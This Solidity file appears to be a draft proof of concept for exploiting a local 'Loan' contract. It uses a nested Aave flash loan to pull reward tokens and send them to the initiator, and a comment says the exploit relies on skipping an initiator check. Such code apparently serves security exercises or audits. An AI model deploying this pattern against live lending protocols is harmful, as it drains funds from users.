// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {IFlashLoanSimpleReceiver} from "./IFlashLoanSimpleReceiver.sol";
import {IPoolAddressesProvider} from "./IPoolAddressesProvider.sol";
import {IPool} from "./IPool.sol";
import {Loan} from "./Loan.sol";

contract DoubleLoan is IFlashLoanSimpleReceiver {
    IPoolAddressesProvider public constant ADDRESSES_PROVIDER = 
        IPoolAddressesProvider(0x0496275d34753A48320CA58103d5220d394FF77F);
    IPool public immutable POOL;
    Loan public immutable loan;

    constructor(address _loan) {
        loan = Loan(_loan);
        POOL = IPool(ADDRESSES_PROVIDER.getPool());
    }

    function removeLoan(address token, uint256 amount) external {
        loan.removeLoan(token, amount);
        IERC20(token).transfer(msg.sender, amount);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        require(msg.sender == address(POOL), "!pool");
        IERC20(asset).approve(address(POOL), amount + premium);
        // @todo define exploit by skipping initatior check

        IERC20(asset).transfer(address(loan), amount);
        POOL.flashLoanSimple(address(loan), asset, amount, "", 0);

        loan.removeLoan(loan.rewardToken(), amount);
        IERC20(loan.rewardToken()).transfer(initiator, amount);

        // loan.removeLoan(asset, amount / 2);

        // @note he funds will be automatically pulled at the conclusion of your operation.
        return true;
    }

}
